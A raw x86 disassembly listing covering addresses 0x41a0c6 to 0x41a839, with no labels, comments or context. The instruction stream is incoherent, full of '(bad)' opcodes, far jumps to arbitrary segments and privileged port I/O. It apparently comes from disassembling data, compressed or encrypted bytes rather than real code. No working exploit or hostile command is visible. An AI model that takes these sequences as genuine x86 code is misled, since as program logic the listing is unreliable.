  41a0c6:	pop    esp
  41a0c7:	call   0x6f0d:0x2e85a58a
  41a0ce:	sbb    esp,ecx
  41a0d0:	ins    BYTE PTR es:[edi],dx
  41a0d1:	repz cdq 
  41a0d3:	stc    
  41a0d4:	jmp    0x41a13e
  41a0d6:	cdq    
  41a0d7:	pop    esp
  41a0d8:	stc    
  41a0d9:	repnz xchg ecx,eax
  41a0db:	mov    al,0x8e
  41a0dd:	push   eax
  41a0de:	sahf   
  41a0df:	or     BYTE PTR [eax+0x5c2d8f21],ch
  41a0e5:	je     0x41a11b
  41a0e7:	sub    DWORD PTR [edi+0x28],0x6439c615
  41a0ee:	out    0xfd,eax
  41a0f0:	add    al,0xd9
  41a0f2:	enter  0xa914,0x45
  41a0f6:	fbld   TBYTE PTR [edx+0x71]
  41a0f9:	aas    
  41a0fa:	cmp    esp,DWORD PTR [eax-0x73cf99ed]
  41a100:	xor    ebx,ebx
  41a102:	xchg   DWORD PTR [eax+0x35],eax
  41a105:	xchg   esi,eax
  41a106:	add    esi,edx
  41a108:	push   edx
  41a109:	ins    BYTE PTR es:[edi],dx
  41a10a:	std    
  41a10b:	fimul  DWORD PTR [ebx]
  41a10d:	arpl   WORD PTR [eax+0x6b4a2da3],sp
  41a113:	adc    al,0xc5
  41a115:	neg    BYTE PTR [esi-0x2e]
  41a118:	adc    al,0xdd
  41a11a:	mov    esp,0x98e844f0
  41a11f:	hlt    
  41a120:	shr    dh,0x6b
  41a123:	pop    ecx
  41a124:	sahf   
  41a125:	jl     0x41a180
  41a127:	xchg   edi,eax
  41a128:	ss dec edi
  41a12a:	je     0x41a155
  41a12c:	sti    
  41a12d:	xchg   ecx,eax
  41a12e:	inc    edx
  41a12f:	jmp    0x41a0c9
  41a131:	fs inc ecx
  41a133:	xor    al,0x3a
  41a135:	aaa    
  41a136:	rcl    DWORD PTR [ebx+0x7ab1f87b],cl
  41a13c:	dec    esp
  41a13d:	enter  0x71c7,0x88
  41a141:	mov    cl,0x16
  41a143:	rcr    BYTE PTR [esi+0x3e],1
  41a146:	sahf   
  41a147:	call   0xd71a:0xa7563317
  41a14e:	adc    DWORD PTR [edi],0xffffff98
  41a151:	shr    eax,1
  41a153:	xchg   ebp,eax
  41a154:	mov    DWORD PTR [edx],edx
  41a156:	push   esi
  41a157:	imul   esp,DWORD PTR [ebp-0xc],0x7399e27c
  41a15e:	xor    edx,DWORD PTR [ecx-0x74]
  41a161:	(bad)  
  41a163:	aaa    
  41a164:	je     0x41a13e
  41a166:	xchg   ecx,eax
  41a167:	cmp    al,0xa1
  41a169:	inc    edx
  41a16a:	dec    ebx
  41a16b:	ret    
  41a16c:	adc    DWORD PTR es:[ebx+0x24074ff5],ebx
  41a173:	pop    ebx
  41a174:	test   eax,0xa450cad1
  41a179:	lods   eax,DWORD PTR ds:[esi]
  41a17a:	or     al,bl
  41a17c:	ror    edi,cl
  41a17e:	repz in eax,dx
  41a180:	jb     0x41a10d
  41a182:	fsubr  QWORD PTR [ebx-0x1c]
  41a185:	in     eax,dx
  41a186:	ins    BYTE PTR es:[edi],dx
  41a187:	push   edx
  41a188:	ds jge 0x41a157
  41a18b:	fs pop esi
  41a18d:	pop    esp
  41a18e:	sbb    dh,0xde
  41a191:	pop    esi
  41a192:	pop    dx
  41a194:	adc    DWORD PTR [ebp+0x3a],edi
  41a197:	dec    esi
  41a198:	xlat   BYTE PTR ds:[ebx]
  41a199:	ror    BYTE PTR [ebx],0xee
  41a19c:	popa   
  41a19d:	mov    edi,fs
  41a19f:	pop    ecx
  41a1a0:	xchg   DWORD PTR [ebx-0x52c2400e],ecx
  41a1a6:	icebp  
  41a1a7:	icebp  
  41a1a8:	rcr    DWORD PTR [esi-0x2],0x8e
  41a1ac:	jmp    0x5647:0x148691f4
  41a1b3:	sahf   
  41a1b4:	pop    edx
  41a1b5:	out    0x6c,eax
  41a1b7:	dec    esi
  41a1b8:	pusha  
  41a1b9:	pop    di
  41a1bb:	mov    dl,0xd9
  41a1bd:	inc    edi
  41a1be:	fcomp  st(0)
  41a1c0:	push   edi
  41a1c1:	inc    esi
  41a1c2:	dec    edi
  41a1c3:	pop    edx
  41a1c4:	or     esp,DWORD PTR [ebp+0x1f692062]
  41a1ca:	sbb    eax,0x2fe9962
  41a1cf:	lahf   
  41a1d0:	imul   ebx,DWORD PTR ds:0x2f75ff47,0x58
  41a1d7:	mov    bl,0xb3
  41a1d9:	test   DWORD PTR [edi+0x28],ebp
  41a1dc:	sub    BYTE PTR [ecx],dl
  41a1de:	repz xor eax,0xf84818ae
  41a1e4:	mov    esp,0x76740f74
  41a1e9:	rcr    BYTE PTR [eax-0x60],cl
  41a1ec:	mov    bl,0x60
  41a1ee:	mov    esi,esi
  41a1f0:	adc    al,0x87
  41a1f2:	and    BYTE PTR [ecx],dl
  41a1f4:	pop    eax
  41a1f5:	enter  0x60c9,0x54
  41a1f9:	loopne 0x41a1c1
  41a1fb:	mov    ds:0x72789fd8,eax
  41a200:	les    esp,FWORD PTR [esi]
  41a202:	addr16 loop 0x41a241
  41a205:	mov    al,0x11
  41a207:	and    eax,0xa73a8090
  41a20c:	ret    0xc35e
  41a20f:	dec    edi
  41a210:	or     edi,edi
  41a212:	jmp    0xae40:0x8d53f54e
  41a219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a21a:	shr    DWORD PTR [ebx],cl
  41a21c:	inc    ecx
  41a21d:	push   0x0
  41a21f:	add    BYTE PTR [eax],al
  41a221:	add    BYTE PTR [eax],bl
  41a223:	push   ebp
  41a224:	push   cs
  41a225:	add    eax,0x5d1b5f4f
  41a22a:	lods   eax,DWORD PTR ds:[esi]
  41a22b:	test   al,0x5b
  41a22d:	gs mov bl,0x9d
  41a230:	rcl    BYTE PTR [eax*8-0xbfffee2],cl
  41a237:	add    al,0x0
  41a239:	add    BYTE PTR [edi+0x7b49be96],dl
  41a23f:	inc    edx
  41a240:	mov    bh,0xbd
  41a242:	mov    ds:0xf58e004c,al
  41a247:	shl    ch,0xaf
  41a24a:	(bad)  
  41a24b:	sbb    BYTE PTR [ecx+ecx*4],ah
  41a24e:	mov    cl,0x85
  41a250:	adc    eax,DWORD PTR [ebx+0x5f]
  41a253:	sub    DWORD PTR [ebx+0x1a],esp
  41a256:	jo     0x41a206
  41a258:	cmp    bl,al
  41a25a:	retf   0xb704
  41a25d:	mov    ebp,DWORD PTR [ebx+0x6530425b]
  41a263:	cli    
  41a264:	inc    esp
  41a265:	adc    al,0x82
  41a267:	sbb    DWORD PTR [edx+0x62afbf0e],esi
  41a26d:	sbb    cl,BYTE PTR [ecx+0x5b]
  41a270:	adc    BYTE PTR [ecx-0x4ad36d8],dh
  41a276:	pop    es
  41a277:	cli    
  41a278:	rcl    BYTE PTR [ebp+0x35],1
  41a27b:	(bad)  
  41a27c:	jb     0x41a2c9
  41a27e:	adc    al,BYTE PTR [ebp+0x3069b621]
  41a284:	xchg   DWORD PTR [ebp-0x14],edi
  41a287:	mov    ch,0xb9
  41a289:	dec    ebp
  41a28a:	in     eax,dx
  41a28b:	pop    esi
  41a28c:	or     eax,0x2ea1ce0c
  41a291:	out    0x36,al
  41a293:	dec    eax
  41a294:	rol    BYTE PTR [ebx+0x328ff2ad],cl
  41a29a:	ins    BYTE PTR es:[edi],dx
  41a29b:	cdq    
  41a29c:	cmp    edi,DWORD PTR [edi-0x64]
  41a29f:	jno    0x41a2a4
  41a2a1:	xor    al,0xe7
  41a2a3:	iret   
  41a2a4:	sahf   
  41a2a5:	(bad)  
  41a2a6:	int3   
  41a2a7:	ins    DWORD PTR es:[edi],dx
  41a2a8:	inc    esi
  41a2a9:	cs in  eax,dx
  41a2ab:	aaa    
  41a2ac:	test   al,0x68
  41a2ae:	in     al,0x5
  41a2b0:	xor    eax,0x97f9f14b
  41a2b5:	mov    eax,0x4640de1d
  41a2ba:	ret    
  41a2bb:	pop    ebx
  41a2bc:	cmp    eax,0xf042da69
  41a2c1:	xchg   esp,eax
  41a2c2:	addr16 retf 
  41a2c4:	mov    ds:0xacbff005,eax
  41a2c9:	call   0x94c9:0x95a82aaa
  41a2d0:	xor    edx,esp
  41a2d2:	cmc    
  41a2d3:	xor    eax,DWORD PTR [edx+0x2c653c7d]
  41a2d9:	inc    BYTE PTR [edi-0x5c]
  41a2dc:	mov    bh,0x2e
  41a2de:	mov    bh,0x93
  41a2e0:	jae    0x41a2e9
  41a2e2:	inc    edi
  41a2e3:	inc    ebp
  41a2e4:	or     ah,dh
  41a2e6:	add    al,0xc
  41a2e8:	sub    eax,0x1bf7fe33
  41a2ed:	xchg   ebp,eax
  41a2ee:	adc    eax,0x72e7e239
  41a2f3:	jns    0x41a2cf
  41a2f5:	fst    DWORD PTR [eiz*1+0x2de175b6]
  41a2fc:	aad    0x61
  41a2fe:	push   0x10
  41a300:	xchg   BYTE PTR [esi],dl
  41a302:	sub    eax,0xc550f068
  41a307:	call   0x69c5:0xdc503f4f
  41a30e:	pop    ecx
  41a30f:	or     eax,0x192ac2e7
  41a314:	or     edx,DWORD PTR [edx+0x1cd87a72]
  41a31a:	cs jnp 0x41a33b
  41a31d:	push   0xbe29d19d
  41a322:	test   BYTE PTR [ecx-0x7830dea8],dl
  41a328:	pop    esi
  41a329:	push   esi
  41a32a:	pop    edi
  41a32b:	and    cl,BYTE PTR [ecx+edi*8-0x76a5b7af]
  41a332:	push   edx
  41a333:	es addr16 cmp eax,0x70e54f7a
  41a33a:	mov    dh,0x33
  41a33c:	les    esi,FWORD PTR [edi]
  41a33e:	aaa    
  41a33f:	repz out dx,al
  41a341:	and    dh,BYTE PTR [eax+0x7c8db818]
  41a347:	add    eax,0x568c4a29
  41a34c:	inc    ecx
  41a34d:	dec    ecx
  41a34e:	mov    ecx,DWORD PTR [edi]
  41a350:	push   ecx
  41a351:	xor    ecx,DWORD PTR [ebx+0x7a]
  41a354:	and    DWORD PTR [ecx],esp
  41a356:	in     eax,dx
  41a357:	scas   eax,DWORD PTR es:[edi]
  41a358:	(bad)  
  41a359:	ins    DWORD PTR es:[edi],dx
  41a35a:	or     eax,0xfef49788
  41a35f:	rol    BYTE PTR gs:[edx+0x8fd6c5e],1
  41a366:	sub    BYTE PTR [edi-0x6c87c507],bl
  41a36c:	jmp    0x19fdcd70
  41a371:	mov    dl,0x12
  41a373:	xchg   bh,dh
  41a375:	aaa    
  41a376:	das    
  41a377:	in     eax,0xe5
  41a379:	mul    BYTE PTR [ecx]
  41a37b:	cmp    eax,0x2536a435
  41a380:	xchg   ecx,eax
  41a381:	xchg   esi,eax
  41a382:	call   DWORD PTR [eax*4-0x158d8df0]
  41a389:	jge    0x41a383
  41a38b:	inc    eax
  41a38c:	out    dx,al
  41a38d:	lock jne 0x41a377
  41a390:	cmp    al,0xd8
  41a392:	mov    al,ds:0x177ffe1f
  41a397:	nop
  41a398:	iret   
  41a399:	xor    esp,esi
  41a39b:	sub    dl,ah
  41a39d:	pop    ecx
  41a39e:	iret   
  41a39f:	fadd   DWORD PTR [ebp+ebp*2+0x19]
  41a3a3:	fidiv  DWORD PTR [ebx+0x638a8e9f]
  41a3a9:	mov    ah,0x12
  41a3ab:	dec    ebx
  41a3ac:	sbb    DWORD PTR [eax],eax
  41a3ae:	ss int3 
  41a3b0:	pop    ebx
  41a3b1:	inc    DWORD PTR [edx+0x1d]
  41a3b4:	cwde   
  41a3b5:	imul   esp,DWORD PTR [edx],0x24
  41a3b8:	cdq    
  41a3b9:	vandps xmm4,xmm7,xmm2
  41a3bd:	call   0x772f25f1
  41a3c2:	enter  0xb1e9,0x39
  41a3c6:	mov    ah,0xab
  41a3c8:	lods   eax,DWORD PTR ds:[esi]
  41a3c9:	aad    0x39
  41a3cb:	mov    cl,0x61
  41a3cd:	and    dl,BYTE PTR [edi-0x1d]
  41a3d0:	test   al,0x77
  41a3d2:	js     0x41a436
  41a3d4:	xchg   BYTE PTR [eax-0x21],al
  41a3d7:	pop    eax
  41a3d8:	loopne 0x41a386
  41a3da:	pop    ebx
  41a3db:	mov    esp,0x89892bea
  41a3e0:	add    eax,DWORD PTR [ebx+edx*8]
  41a3e3:	rol    BYTE PTR [ebp-0x4b],1
  41a3e6:	shrd   DWORD PTR [eax+0x94305a],edx,0x76
  41a3ee:	loop   0x41a44d
  41a3f0:	pop    eax
  41a3f1:	int    0x8
  41a3f3:	mov    ch,0x62
  41a3f5:	cmp    DWORD PTR [eax+eax*4+0x67],eax
  41a3f9:	mov    eax,0x4d618da8
  41a3fe:	push   ebx
  41a3ff:	sbb    BYTE PTR [ebx],0xf1
  41a402:	sar    DWORD PTR [esi-0x473833e0],cl
  41a408:	retf   0x33c5
  41a40b:	jo     0x41a480
  41a40d:	(bad)  
  41a40e:	adc    BYTE PTR [edi],bl
  41a410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a411:	xor    DWORD PTR [edx-0x5c9f98f6],eax
  41a417:	jp     0x41a43e
  41a419:	icebp  
  41a41a:	test   BYTE PTR [esi-0x1d6cb0c3],0x9f
  41a421:	leave  
  41a422:	mov    al,0xd8
  41a424:	nop
  41a425:	aam    0x1e
  41a427:	and    eax,edx
  41a429:	imul   ebx,DWORD PTR [edi+0x17],0x6d
  41a42d:	xor    DWORD PTR [ebx],edx
  41a42f:	icebp  
  41a430:	push   ss
  41a431:	lods   al,BYTE PTR ds:[esi]
  41a432:	(bad)
  41a437:	les    ebx,FWORD PTR [ebp+0x17]
  41a43a:	mov    ds,edx
  41a43c:	cmp    ecx,edx
  41a43e:	into   
  41a43f:	lock pop ecx
  41a441:	inc    ebp
  41a442:	test   BYTE PTR [ecx-0x31efa531],cl
  41a448:	clc    
  41a449:	pop    ebx
  41a44a:	add    DWORD PTR [eax+ebp*2+0xb7f08f3],esi
  41a451:	(bad)  
  41a452:	enter  0xf0c6,0x19
  41a456:	mov    cl,0x38
  41a458:	popa   
  41a459:	adc    BYTE PTR [eax+eax*1-0x5136c767],0xe1
  41a461:	int    0xa2
  41a463:	in     eax,dx
  41a464:	rcl    DWORD PTR [eax-0x2c],0xbd
  41a468:	imul   esp,edx,0x52
  41a46b:	sub    edi,DWORD PTR [ebx-0x39]
  41a46e:	jae    0x41a46b
  41a470:	sub    eax,0x97073a79
  41a475:	push   esi
  41a476:	cmc    
  41a477:	repnz mov esi,0xa0841940
  41a47e:	stos   BYTE PTR es:[edi],al
  41a47f:	sbb    BYTE PTR [ebx+0x35],dh
  41a482:	out    dx,al
  41a483:	or     eax,0x4c9a74db
  41a488:	mov    esi,0x77dc900d
  41a48d:	mov    edi,DWORD PTR [eax+0x51]
  41a490:	fst    QWORD PTR [ecx-0x27]
  41a493:	imul   DWORD PTR [eax+0x6162a2ed]
  41a499:	jmp    0x87aab9d5
  41a49e:	adc    DWORD PTR [ebp+0x25],0x3b05256c
  41a4a5:	xor    BYTE PTR [esi],bh
  41a4a7:	sub    BYTE PTR [ebx-0x1cccbda7],0x9c
  41a4ae:	outs   dx,DWORD PTR ds:[esi]
  41a4af:	inc    eax
  41a4b0:	xchg   BYTE PTR [ecx],al
  41a4b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4b3:	ret    0xe9f0
  41a4b6:	xor    edi,DWORD PTR [edx-0x7acdac10]
  41a4bc:	sbb    eax,0xfb8f5251
  41a4c1:	xor    DWORD PTR [edi],edi
  41a4c3:	clc    
  41a4c4:	jmp    0x65dd:0xc823caa4
  41a4cb:	nop
  41a4cc:	jae    0x41a48c
  41a4ce:	es repnz aam 0xec
  41a4d2:	sbb    BYTE PTR [edx-0x3eda54b7],dh
  41a4d8:	fdivr  st(3),st
  41a4da:	mul    DWORD PTR [eax-0x48]
  41a4dd:	rcr    BYTE PTR ds:0x5257869b,0xcc
  41a4e4:	xchg   esp,eax
  41a4e5:	push   ds
  41a4e6:	jb     0x41a4e0
  41a4e8:	mov    al,0x35
  41a4ea:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4ec:	lahf   
  41a4ed:	pop    edi
  41a4ee:	pop    ebx
  41a4ef:	pop    ebp
  41a4f0:	scas   eax,DWORD PTR es:[edi]
  41a4f1:	and    BYTE PTR [ebx],ch
  41a4f3:	mov    bh,0x3d
  41a4f5:	sahf   
  41a4f6:	aas    
  41a4f7:	cld    
  41a4f8:	dec    esi
  41a4f9:	std    
  41a4fa:	dec    esi
  41a4fb:	push   esi
  41a4fc:	pop    edi
  41a4fd:	adc    eax,0x74954c41
  41a502:	repnz clc 
  41a504:	mov    ecx,0x94faee86
  41a509:	nop
  41a50a:	clc    
  41a50b:	mov    bh,0x74
  41a50d:	aas    
  41a50e:	push   edx
  41a50f:	inc    eax
  41a510:	xor    eax,DWORD PTR [eax]
  41a512:	loope  0x41a4f4
  41a514:	scas   al,BYTE PTR es:[edi]
  41a515:	sub    edi,eax
  41a517:	test   al,0x25
  41a519:	jecxz  0x41a569
  41a51b:	(bad)  
  41a51c:	cmp    DWORD PTR [edi+0x8],esp
  41a51f:	fdivr  st(7),st
  41a521:	nop
  41a522:	pop    ebp
  41a523:	pop    ds
  41a524:	ficomp DWORD PTR [ecx-0x4efe460c]
  41a52a:	sub    eax,0x94257f43
  41a52f:	dec    eax
  41a530:	out    dx,al
  41a531:	sbb    ecx,ebx
  41a533:	push   ebp
  41a534:	in     al,0xc7
  41a536:	aas    
  41a537:	test   ch,bl
  41a539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a53a:	add    eax,0xcb0847d1
  41a53f:	jno    0x41a5a2
  41a541:	in     al,dx
  41a542:	adc    eax,0x1c8a0878
  41a547:	xchg   esi,eax
  41a548:	jne    0x41a50c
  41a54a:	test   DWORD PTR [edx],esp
  41a54c:	sub    al,0x84
  41a54e:	push   es
  41a54f:	or     BYTE PTR gs:[ebx+0x7b],bh
  41a553:	and    al,0x20
  41a555:	push   cx
  41a557:	or     BYTE PTR [edx+0x3d4e87c8],ah
  41a55d:	sub    al,0x3a
  41a55f:	loope  0x41a5a8
  41a561:	pop    ebp
  41a562:	mov    esp,0x995b6bfc
  41a567:	aad    0x76
  41a569:	inc    edi
  41a56a:	in     eax,dx
  41a56b:	jns    0x41a518
  41a56d:	mov    ds:0x8a0cd8a7,al
  41a572:	repnz xor BYTE PTR [esi+0x50987b11],dh
  41a579:	not    ch
  41a57b:	push   eax
  41a57c:	push   esi
  41a57d:	push   ss
  41a57e:	sbb    dl,BYTE PTR [edi-0x2a73589]
  41a584:	pop    ebx
  41a585:	fsubr  st,st(2)
  41a587:	int    0x78
  41a589:	push   esi
  41a58a:	out    dx,eax
  41a58b:	or     ecx,0x73
  41a58e:	xor    BYTE PTR [eax+0x5e1889c],dl
  41a594:	imul   edx,DWORD PTR [edx-0x5b],0xffffffe9
  41a598:	xor    DWORD PTR [ebp+ecx*2-0x5c248bf3],esi
  41a59f:	adc    bh,BYTE PTR [ecx+edi*2+0x138ba36e]
  41a5a6:	js     0x41a573
  41a5a8:	mov    ebp,0xd53490a3
  41a5ad:	ins    BYTE PTR es:[edi],dx
  41a5ae:	or     edx,ecx
  41a5b0:	idiv   BYTE PTR [eax+0x46]
  41a5b3:	mov    edx,0x9e7426f7
  41a5b8:	push   ebx
  41a5b9:	lahf   
  41a5ba:	push   edi
  41a5bb:	mov    cl,0x33
  41a5bd:	call   0x96d7a433
  41a5c2:	loop   0x41a58d
  41a5c4:	jle    0x41a59a
  41a5c6:	fs (bad) 
  41a5c8:	rcr    BYTE PTR [edi],1
  41a5ca:	aam    0xbc
  41a5cc:	ss pop ecx
  41a5ce:	aaa    
  41a5cf:	push   ss
  41a5d0:	mov    dl,0xda
  41a5d2:	mov    ecx,0xeee8459f
  41a5d7:	cld    
  41a5d8:	push   0x7c
  41a5da:	xor    BYTE PTR [ebp-0xe548501],bh
  41a5e0:	push   ecx
  41a5e1:	in     al,dx
  41a5e2:	stos   DWORD PTR es:[edi],eax
  41a5e3:	aas    
  41a5e4:	xor    eax,0x60656f0
  41a5e9:	push   ebp
  41a5ea:	test   ecx,eax
  41a5ec:	adc    bl,BYTE PTR [ebx]
  41a5ee:	sub    eax,0xf5433f11
  41a5f3:	dec    eax
  41a5f4:	jecxz  0x41a66a
  41a5f6:	sbb    DWORD PTR [ebx-0x32],eax
  41a5f9:	hlt    
  41a5fa:	(bad)  
  41a5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5fc:	and    BYTE PTR [esi+0x11],bl
  41a5ff:	and    DWORD PTR [eax-0x3e],edx
  41a602:	adc    cl,BYTE PTR [edi-0x18]
  41a605:	dec    ecx
  41a606:	and    eax,0x3d92185
  41a60b:	stos   BYTE PTR es:[edi],al
  41a60c:	xchg   edx,eax
  41a60d:	pop    esp
  41a60e:	add    ah,cl
  41a610:	repz and bl,dh
  41a613:	pop    ebp
  41a614:	xchg   BYTE PTR [ebx],bh
  41a616:	jp     0x41a619
  41a618:	sti    
  41a619:	push   0x669569e0
  41a61e:	push   ecx
  41a61f:	cmp    al,0xa3
  41a621:	out    0xb8,al
  41a623:	add    eax,0xd8718f
  41a628:	loop   0x41a64e
  41a62a:	jmp    0x9dda:0x16765485
  41a631:	(bad)  
  41a632:	add    BYTE PTR [esi+0x1c],0xd
  41a636:	test   DWORD PTR [eax+0x5a5c609a],ecx
  41a63c:	and    ah,ah
  41a63e:	pushf  
  41a63f:	not    BYTE PTR ds:0x7e0a6aab
  41a645:	ret    0x9fbf
  41a648:	mov    al,0x23
  41a64a:	imul   esp,ebp,0x68
  41a64d:	outs   dx,DWORD PTR ds:[esi]
  41a64e:	out    dx,al
  41a64f:	jmp    0x495b:0x92cf63b6
  41a656:	mov    cl,0x31
  41a658:	dec    esp
  41a659:	aas    
  41a65a:	sbb    edx,DWORD PTR [eax]
  41a65c:	inc    edx
  41a65d:	sub    DWORD PTR [edx-0x1d05928d],eax
  41a663:	es push 0x2d
  41a666:	clc    
  41a667:	inc    ebp
  41a668:	inc    BYTE PTR [eax+0x0]
  41a66b:	push   esi
  41a66c:	cmp    bl,BYTE PTR [ebp-0x497b7101]
  41a672:	outs   dx,BYTE PTR ds:[esi]
  41a673:	jmp    0xa834fe57
  41a678:	inc    esp
  41a679:	imul   edi,DWORD PTR [edx+0x50b39232],0xbf823497
  41a683:	xchg   ecx,eax
  41a684:	sbb    eax,0x767d59e4
  41a689:	in     al,0x1e
  41a68b:	in     al,dx
  41a68c:	test   DWORD PTR ds:0x9ee76a21,edi
  41a692:	dec    ebx
  41a693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a694:	ins    BYTE PTR es:[edi],dx
  41a695:	mov    bh,0x94
  41a697:	add    al,0x88
  41a699:	ds out dx,eax
  41a69b:	mov    edx,0x2b5b8975
  41a6a0:	inc    esp
  41a6a1:	push   ds
  41a6a2:	enter  0xddd9,0x6b
  41a6a6:	jmp    0x9f946856
  41a6ab:	retw   
  41a6ad:	or     DWORD PTR [edi],ebx
  41a6af:	jno    0x41a6f7
  41a6b1:	pop    es
  41a6b2:	inc    ebp
  41a6b3:	into   
  41a6b4:	in     eax,dx
  41a6b5:	(bad)  
  41a6b6:	fdivr  DWORD PTR [edx]
  41a6b8:	fwait
  41a6b9:	and    bl,BYTE PTR [ecx]
  41a6bb:	dec    ebp
  41a6bc:	aaa    
  41a6bd:	xlat   BYTE PTR ds:[ebx]
  41a6be:	or     esp,esi
  41a6c0:	test   cl,0x83
  41a6c3:	lahf   
  41a6c4:	or     edi,DWORD PTR ds:0xa8d1aa18
  41a6ca:	popa   
  41a6cb:	scas   eax,DWORD PTR es:[edi]
  41a6cc:	ins    DWORD PTR es:[edi],dx
  41a6cd:	std    
  41a6ce:	retf   
  41a6cf:	sub    esi,DWORD PTR [esi+0x1258e7f0]
  41a6d5:	adc    DWORD PTR [eax+esi*2+0x75],esi
  41a6d9:	push   esi
  41a6da:	xchg   ebx,eax
  41a6db:	dec    ebp
  41a6dc:	or     eax,0x1853719a
  41a6e1:	inc    edi
  41a6e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6e4:	sub    edi,ebx
  41a6e6:	cld    
  41a6e7:	hlt    
  41a6e8:	pop    edx
  41a6e9:	int    0x13
  41a6eb:	or     DWORD PTR [eax-0x63c3de1],esi
  41a6f1:	add    ebx,edx
  41a6f3:	push   ecx
  41a6f5:	xlat   BYTE PTR ds:[ebx]
  41a6f6:	jmp    0xaff1ce
  41a6fb:	stc    
  41a6fc:	push   esp
  41a6fd:	(bad)  
  41a6fe:	ss mov ah,0x46
  41a701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a702:	shl    ebx,0x3b
  41a705:	mul    DWORD PTR [ebp-0x6c]
  41a708:	and    edi,DWORD PTR [ebp+0x368646c2]
  41a70e:	push   0x16
  41a710:	jmp    DWORD PTR [ecx-0x64ef7195]
  41a716:	scas   al,BYTE PTR es:[edi]
  41a717:	icebp  
  41a718:	outs   dx,BYTE PTR ds:[esi]
  41a719:	and    edi,DWORD PTR [ebx]
  41a71b:	neg    DWORD PTR [eax]
  41a71d:	cmp    BYTE PTR [eax-0x68],dl
  41a720:	push   es
  41a721:	popf   
  41a722:	(bad)  
  41a723:	push   ebp
  41a724:	ss pop esi
  41a726:	xrelease xchg DWORD PTR [esi-0x3ec62422],esp
  41a72d:	sub    al,0x0
  41a72f:	add    BYTE PTR [eax],al
  41a731:	add    BYTE PTR [esi+0x6f],cl
  41a734:	je     0x41a75e
  41a736:	jne    0x41a773
  41a738:	pop    esi
  41a739:	outs   dx,DWORD PTR ds:[esi]
  41a73a:	out    dx,eax
  41a73b:	aaa    
  41a73c:	jae    0x41a716
  41a73e:	mov    al,ds:0xb9517735
  41a743:	and    eax,DWORD PTR [ecx]
  41a745:	add    ah,dh
  41a747:	add    al,0x0
  41a749:	add    BYTE PTR [ecx-0x634b8512],cl
  41a74f:	ficom  DWORD PTR [esp+ebx*8-0x7c]
  41a753:	adc    dl,BYTE PTR [esi+eiz*1]
  41a756:	or     al,0xa5
  41a758:	jno    0x41a759
  41a75a:	push   es
  41a75b:	mov    BYTE PTR [ebx],cl
  41a75d:	sub    DWORD PTR [edx+0x15],ebp
  41a760:	xchg   ecx,eax
  41a761:	sahf   
  41a762:	or     ebp,DWORD PTR [ecx-0x40]
  41a765:	pop    esi
  41a766:	mov    ebp,0xe51b21e9
  41a76b:	add    al,0xf7
  41a76d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a76e:	pushf  
  41a76f:	mov    al,ds:0x2478dde8
  41a774:	xchg   ebx,eax
  41a775:	sbb    bh,BYTE PTR [eax+0x56b128a]
  41a77b:	mov    ds:0x238e3c2c,al
  41a780:	xor    esp,DWORD PTR ss:[esi+0x4193b307]
  41a787:	push   ecx
  41a788:	and    dh,bh
  41a78a:	inc    ebx
  41a78b:	adc    eax,DWORD PTR [edx-0x66e8b010]
  41a791:	stos   BYTE PTR es:[edi],al
  41a792:	jle    0x41a78b
  41a794:	mov    ds:0x7db58cf4,eax
  41a799:	cmp    BYTE PTR [edx],al
  41a79b:	jmp    0x945e:0xd4126fd0
  41a7a2:	add    ecx,esi
  41a7a4:	enter  0xcfca,0xd1
  41a7a8:	lods   eax,DWORD PTR ds:[esi]
  41a7a9:	mov    bh,BYTE PTR [eax]
  41a7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7ac:	cld    
  41a7ad:	mov    edi,DWORD PTR [edx]
  41a7af:	and    DWORD PTR [ebx*1+0x54e222a],ebx
  41a7b6:	mov    fs,WORD PTR [ebx-0x66efebc8]
  41a7bc:	push   ebp
  41a7bd:	ror    DWORD PTR ds:0x8d9fdf4a,1
  41a7c3:	(bad)  
  41a7c4:	retf   0x8dfa
  41a7c7:	push   ebp
  41a7c8:	or     esp,edx
  41a7ca:	aam    0x3e
  41a7cc:	das    
  41a7cd:	enter  0xf52,0x73
  41a7d1:	nop
  41a7d2:	lods   al,BYTE PTR ds:[esi]
  41a7d3:	dec    esi
  41a7d4:	test   DWORD PTR [eax+0x48],esp
  41a7d7:	cwde   
  41a7d8:	dec    esp
  41a7d9:	cmc    
  41a7da:	or     al,0x60
  41a7dc:	stc    
  41a7dd:	je     0x41a7a4
  41a7df:	fisttp DWORD PTR ds:0x2daa9fa4
  41a7e5:	jg     0x41a7b8
  41a7e7:	xchg   ebp,eax
  41a7e8:	add    eax,edx
  41a7ea:	cmp    BYTE PTR [ebp-0xd],0xde
  41a7ee:	adc    DWORD PTR [eax+0x6c],esp
  41a7f1:	cmc    
  41a7f2:	jno    0x41a800
  41a7f4:	add    ecx,DWORD PTR [esi+0xed873bc]
  41a7fa:	loope  0x41a850
  41a7fc:	leave  
  41a7fd:	aad    0x67
  41a7ff:	or     al,0x41
  41a801:	xchg   esi,eax
  41a802:	shr    eax,0x8b
  41a805:	add    al,0x97
  41a807:	pop    ss
  41a808:	inc    edi
  41a809:	xchg   edi,eax
  41a80a:	and    ebx,esi
  41a80c:	mov    eax,fs:0xbe911df8
  41a812:	test   DWORD PTR [edx-0x2b],esi
  41a815:	xor    DWORD PTR [edx-0x2105b693],ebx
  41a81b:	inc    edx
  41a81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a81d:	test   eax,0x7d74de6d
  41a822:	mov    al,ds:0x10837956
  41a827:	(bad)  
  41a828:	outs   dx,BYTE PTR ds:[esi]
  41a829:	sbb    esi,DWORD PTR [eax]
  41a82b:	loope  0x41a7d5
  41a82d:	in     eax,dx
  41a82e:	rcr    BYTE PTR [edx+0x2b],cl
  41a831:	in     eax,dx
  41a832:	cmp    ebp,DWORD PTR [edx+eax*4]
  41a835:	pusha  
  41a836:	and    dh,BYTE PTR [ebp-0x30]
  41a839:	aam    0x25
